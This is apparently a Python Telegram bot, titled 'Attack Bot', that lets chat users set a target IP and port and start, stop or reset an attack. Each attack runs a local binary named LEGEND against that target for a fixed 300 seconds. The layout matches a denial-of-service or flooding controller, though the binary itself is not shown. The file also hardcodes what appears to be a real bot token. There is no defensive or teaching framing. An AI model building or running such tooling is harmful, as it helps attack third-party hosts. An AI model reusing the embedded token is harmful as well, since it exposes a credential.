from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, ContextTypes, filters
import subprocess

# Bot Token
TOKEN = "7718261626:AAFxIJ5GWbBRN71Qo91NjKSXhRwAisdwyTE"

# Path to your binary
BINARY_PATH = "./LEGEND"

# Global variables
process = None
target_ip = None
target_port = None
attack_time = 300  # Fixed duration

# Start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Welcome to the Attack Bot!\n\n"
        "Use the following commands to control the attack:\n"
        "/set_target <IP> <PORT> - Set target\n"
        "/start_attack - Start attack\n"
        "/stop_attack - Stop attack\n"
        "/reset_attack - Reset attack"
    )

# Set target
async def set_target(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global target_ip, target_port
    try:
        target, port = context.args
        target_ip = target
        target_port = int(port)
        await update.message.reply_text(f"Target set: {target_ip}:{target_port}")
    except ValueError:
        await update.message.reply_text("Invalid format. Use: /set_target <IP> <PORT>")

# Start attack
async def start_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global process, target_ip, target_port, attack_time

    if not target_ip or not target_port:
        await update.message.reply_text("Set target first using /set_target <IP> <PORT>")
        return

    if process and process.poll() is None:
        await update.message.reply_text("Attack is already running.")
        return

    try:
        process = subprocess.Popen([BINARY_PATH, target_ip, str(target_port), str(attack_time)], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        await update.message.reply_text(f"Started attack on {target_ip}:{target_port} for {attack_time} sec.")
    except Exception as e:
        await update.message.reply_text(f"Error: {e}")

# Stop attack
async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global process

    if not process or process.poll() is not None:
        await update.message.reply_text("No attack is currently running.")
        return

    process.terminate()
    process.wait()
    await update.message.reply_text("Attack stopped.")

# Reset attack
async def reset_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global process, target_ip, target_port

    if process and process.poll() is None:
        process.terminate()
        process.wait()

    target_ip = None
    target_port = None
    await update.message.reply_text("Attack reset. Set a new target.")

# Main function
def main():
    application = Application.builder().token(TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("set_target", set_target))
    application.add_handler(CommandHandler("start_attack", start_attack))
    application.add_handler(CommandHandler("stop_attack", stop_attack))
    application.add_handler(CommandHandler("reset_attack", reset_attack))

    application.run_polling()

if __name__ == "__main__":
    main()
